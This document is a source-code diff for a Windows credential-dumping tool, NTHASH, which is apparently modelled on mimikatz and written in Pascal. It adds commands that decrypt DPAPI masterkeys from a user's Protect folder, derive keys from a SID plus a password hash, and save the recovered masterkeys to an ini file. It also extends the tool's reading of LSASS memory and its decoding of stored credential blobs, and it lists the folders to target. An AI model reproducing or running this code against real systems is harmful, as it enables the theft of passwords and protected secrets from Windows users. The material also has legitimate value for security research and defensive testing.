@@ -517,7 +517,7 @@ begin
 end;
 
 //check kuhl_m_sekurlsa_utils.c
-function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil):boolean;
+function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil;save:boolean=false):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
   //1703 works for 1709
@@ -1157,6 +1157,37 @@ begin
   messageboxa(0,'abcdef','ijklmn',MB_OK ); //test
 end;
 
+function compute_hmac(folder,password:string):tbytes;
+var
+sid,sid_hexa:string;
+input_bytes,password_bytes,output_bytes:tbytes;
+begin
+  log('**** compute_hmac ****');
+
+                          sid:=folder;
+                          delete(sid,1,pos('S-1-5',sid)-1); //delete before
+                          if pos('\',sid)>0
+                             then sid:=copy(sid,1,pos('\',sid)-1);
+                          sid_hexa:=ByteToHexaString ( AnsiStringtoByte(sid,true))+'0000';
+                          //log(input);
+                          //now compute hmac
+                          input_bytes:=HexaStringToByte2 (sid_hexa);
+                          password_bytes:=HexaStringToByte2 (password);
+                          setlength(output_bytes,crypto_hash_len($00008004));
+                          zeromemory(@output_bytes[0],length(output_bytes));
+                          log('Key:'+BytetoHexaString(password_bytes) );   //->password
+                          log('Input:'+BytetoHexaString(input_bytes) ); //->SID UTF-16
+                          if crypto_hash_hmac ($00008004,@password_bytes[0],length(password_bytes),@input_bytes[0],length(input_bytes),@output_bytes [0],crypto_hash_len($00008004))
+                             then
+                              begin
+                              log('**** gethmac SID+sha1(password) ****',0);
+                              log(ByteToHexaString (output_bytes ),0);
+                              result:=output_bytes ;
+                              end
+                              else log('crypto_hash_hmac failed',1);
+
+end;
+
 procedure main;
 var
   dummy:dword;
@@ -1261,13 +1292,15 @@ begin
   log('NTHASH /base64decodefile /input:filename',1);
   log('NTHASH /xorfile /input:filename',1);
   //****************************************************
-  log('NTHASH /dpapimk [/symbol]',1);  //will read mem
+  log('NTHASH /dpapimk [/save] [/symbol]',1);  //will read mem
   log('NTHASH /cryptunprotectdata /binary:filename [/hexa]',1);
   log('NTHASH /cryptunprotectdata /input:hexastring [/hexa]',1);
   log('NTHASH /cryptprotectdata /input:string [mode:MACHINE]',1);
   log('NTHASH /decodecredhist [/binary:filename] [/input:hmachexastring]',1);
-  log('NTHASH /decodeblob /binary:filename [/input:mkkeyhexastring]',1);
-  log('NTHASH /decodemk /binary:filename [/input:hmachexastring] [/password:sha1pwdhexastring]',1);
+  log('NTHASH /decodeblobs /binary:folder',1);
+  log('NTHASH /decodeblob /binary:filename [/input:masterkey_hexastring]',1);
+  log('NTHASH /decodemks /binary:folder [/input:hmachexastring] [/password:sha1pwdhexastring] [/save]',1);
+  log('NTHASH /decodemk /binary:filename [/input:hmachexastring] [/password:sha1pwdhexastring] [/save]',1);
   log('NTHASH /wlansvc /binary:filename',1);
   log('NTHASH /gethash /mode:hashid /input:hexastring',1);
   log('NTHASH /gethmac /mode:hashid /input:hexastring /key:hexastring',1);
@@ -1582,7 +1615,9 @@ p:=pos('/dpapimk',cmdline);
 if p>0 then
    begin
    if findlsakeys (lsass_pid,deskey,aeskey,iv )=false then begin log('findlsakeys failed',1);exit; end;
-   dpapi (lsass_pid );
+   if pos('/save',cmdline)>0
+      then dpapi (lsass_pid,true )
+      else dpapi (lsass_pid,false );
    goto fin;
    end;
 p:=pos('/enumlogonsessions',cmdline);
@@ -1699,6 +1734,7 @@ if p>0 then
      begin
      if input='' then exit;
      //log('widestringtobyte:'+ ByteToHexaString ( AnsiStringtoByte(input,true)),1);
+     //in pipe mode, beware : beware of the space before the pipe !!!!
      if console_output_type<>FILE_TYPE_PIPE then log('widestringtohexa',1);
      log(ByteToHexaString ( AnsiStringtoByte(input,true)),1);
      goto fin;
@@ -2378,21 +2414,22 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
      dw:=0;
      if lowercase(mode)='machine' then dw:=4; //CRYPTPROTECT_LOCAL_MACHINE
       if CryptProtectData_(AnsiStringtoByte (input) ,'data.blob',dw)=false
-         then log('CryptUnProtectData_ NOT OK',1)
-         else log('CryptUnProtectData_ OK - written : data.blob',1);
+         then log('CryptProtectData_ NOT OK',1)
+         else log('CryptProtectData_ OK - written : data.blob',1);
      end;
   p:=pos('/decodeblobs',cmdline);
     if p>0 then
        begin
-       if input='' then
+       if binary='' then
           begin
           log('provide a path where credentials are stored like:',1);
           log('C:\Users\%username%\AppData\Roaming\Microsoft\Credentials',1);
           log('C:\Users\%username%\AppData\local\Microsoft\Credentials',1);
           log('C:\windows\system32\config\systemprofile\AppData\Local\Microsoft\Credentials',1);
+          log('Also, consider using /dpapimk /save to store decrypted masterkeys');
           goto fin;
           end;
-       folder:=input;
+       folder:=binary;
        log('folder:'+folder);
        if sysutils.findFirst(folder+'\*.*', $0000003f, SR) = 0 then
           begin
@@ -2418,12 +2455,18 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
                               decodecredblob(ptr_);
                               end; //if dw>=64 then
                            end; //if dpapi_unprotect_blob ...
-                        end; //if input<>'' ...
+                        end //if input<>'' ...
+                        else
+                        begin
+                        log('filename:'+sr.Name ,1);
+                        log('masterley:'+GUIDToString ( myblob.guidMasterKey ),1);
+                        log('no key...',1);
+                        end;
                      end; //if decodeblob ...
                   end; //if (SR.Name <> '.') ...
             until sysutils.FindNext(SR) <> 0;
             sysutils.FindClose(SR);
-          end;
+          end; //if sysutils.findFirst...
        goto fin;
        end;
   p:=pos('/decodeblob',cmdline);
@@ -2439,6 +2482,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
           if decodeblob (binary,@myblob,1)=false then log('not ok',1);
           //goto fin;
           input:=readini(GUIDToString(myblob.guidMasterKey),'MasterKey','','masterkeys.ini');
+          if input<>'' then log('found masterkey in masterkeys.ini',0);
           end;
        if input<>'' then
            begin
@@ -2467,10 +2511,70 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
            end;
        goto fin;
        end;
+  p:=pos('/decodemks',cmdline);
+    if p>0 then
+       begin
+       folder:=binary;
+       log('folder:'+folder);
+
+       if pos('S-1-5',folder)>0
+                 then
+                   begin
+                   output_:=compute_hmac(folder,password);
+                   setlength(input_,crypto_hash_len($00008004));
+                   input_:=output_ ; //->HMAC KEY (utf-16(sid)+sha1)
+                   end
+                 else
+                   begin log('cannot detect SID in path',1);goto fin;end;
+
+              if sysutils.findFirst(folder+'\*.*', $0000003f, SR) = 0 then
+                 begin
+                   repeat
+                       if (SR.Name <> '.') and (SR.Name <> '..') and ((SR.Name <> 'Preferred')) then
+                       begin
+                       log('filename:'+SR.Name);
+                       if decodemk (folder+'\'+SR.Name,@mk)=false then log('decodemk not ok',1);
+                       if length(output_ )>0 then
+                          begin
+                          ptr_:=nil;
+                                      if dpapi_unprotect_masterkey_with_shaDerivedkey(mk,@input_[0],length(input_),ptr_,dw)
+                                         then
+                                         begin
+                                          log('******************************',1);
+                                          log('GUID:'+GUIDToString (mk.szGuid),1); ;
+                                          log('dpapi_unprotect_masterkey_with_shaDerivedkey ok',0);
+                                          log('dw:'+inttostr(dw));
+                                          log('KEY:'+ByteToHexaString (ptr_,dw),1);
+                                          crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
+                                          log('SHA1:'+ByteToHexaString (output_),1);
+                                          if pos('/save',cmdline)>0 then
+                                              begin
+                                              writeini(GUIDToString (mk.szGuid),'MasterKey',ByteToHexaString(ptr_,dw),'masterkeys.ini');
+                                              writeini(GUIDToString (mk.szGuid),'SHA1',ByteToHexaString (output_),'masterkeys.ini');
+                                              end;
+                                         end
+                                         else
+                                         begin
+                                         log('******************************',1);
+                                         log('GUID:'+GUIDToString (mk.szGuid),1);
+                                         log('dpapi_unprotect_masterkey_with_shaDerivedkey not ok',1);
+                                         end;
+                          end;
+                       end; //if (SR.Name <> '.') ...
+                 until sysutils.FindNext(SR) <> 0;
+                 sysutils.FindClose(SR);
+                 end; //if sysutils.findFirst
+       goto fin;
+       end;
   p:=pos('/decodemk',cmdline);
       if p>0 then
          begin
-         if binary='' then exit;
+         if binary='' then
+           begin
+           log('Provide the path where you encrypted masterkeys are stored, like:',1);
+           log('C:\Users\%username%\AppData\Roaming\Microsoft\Protect\SID\GUID',1);
+           exit;
+           end;
          if not FileExists (binary) then begin writeln('file does not exist');exit;end;
          if (input='') and (password='') then
             if decodemk (binary,nil)=false then
@@ -2487,32 +2591,16 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
               log('not ok',1);
               goto fin;
               end;
+           //input : the hmac has been computed already, sid is irrelevant here
            if input<>'' then input_:=HexaStringToByte2(input);
+           //password : we need to get the sid from the filename's path
            if password<>'' then
              begin
              if pos('S-1-5',binary)>0 then
                begin
-               p:=pos('S-1-5',binary);
-               delete(binary,1,p-1);
-               input:=copy(binary,1,pos('\',binary)-1);
-               input:=ByteToHexaString ( AnsiStringtoByte(input,true))+'0000';
-               //log(input);
-               input_:=HexaStringToByte2 (input);
-               key_:=HexaStringToByte2 (password);
-               setlength(output_,crypto_hash_len($00008004));
-               zeromemory(@output_[0],length(output_));
-               log('Key:'+BytetoHexaString(key_) );   //->password
-               log('Input:'+BytetoHexaString(Input_) ); //->SID UTF-16
-               if crypto_hash_hmac ($00008004,@key_[0],length(key_),@input_[0],length(input_),@output_[0],crypto_hash_len($00008004))
-                  then
-                   begin
-                   log('**** gethmac SID+sha1(password) ****',0);
-                   log(ByteToHexaString (output_ ),0);
-                   end
-                   else begin log('crypto_hash_hmac failed',1);goto fin;end;
-               //exit;
-               setlength(input_,crypto_hash_len($00008004));
-               input_:=output_ ; //->HMAC KEY (utf-16(sid)+sha1)
+                   output_:=compute_hmac(binary,password);
+                   setlength(input_,crypto_hash_len($00008004));
+                   input_:=output_ ; //->HMAC KEY (utf-16(sid)+sha1)
                end else begin log('cannot detect SID in path',1);goto fin;end; //if pos('S-1-5',binary)>0 then
              end; //if password<>'' then
            log('length(input_):'+inttostr(length(input_)));
@@ -2528,12 +2616,19 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
                  //log('KEY:'+ByteToHexaString (output_),1);
                  if console_output_type<>FILE_TYPE_PIPE then
                     begin
+                    log('GUID:'+GUIDToString (mk.szGuid),1);
                     log('KEY:'+ByteToHexaString (ptr_,dw),1);
                     crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
                     log('SHA1:'+ByteToHexaString (output_),1);
+                    if pos('/save',cmdline)>0 then
+                      begin
+                      writeini(GUIDToString (mk.szGuid),'MasterKey',ByteToHexaString(ptr_,dw),'masterkeys.ini');
+                      writeini(GUIDToString (mk.szGuid),'SHA1',ByteToHexaString (output_),'masterkeys.ini');
+                      end;
                     end;
                  if console_output_type=FILE_TYPE_PIPE then
                     begin
+                    //pipe mode, we sent the sha1 key only
                     crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
                     log(ByteToHexaString (output_),1);
                     end;
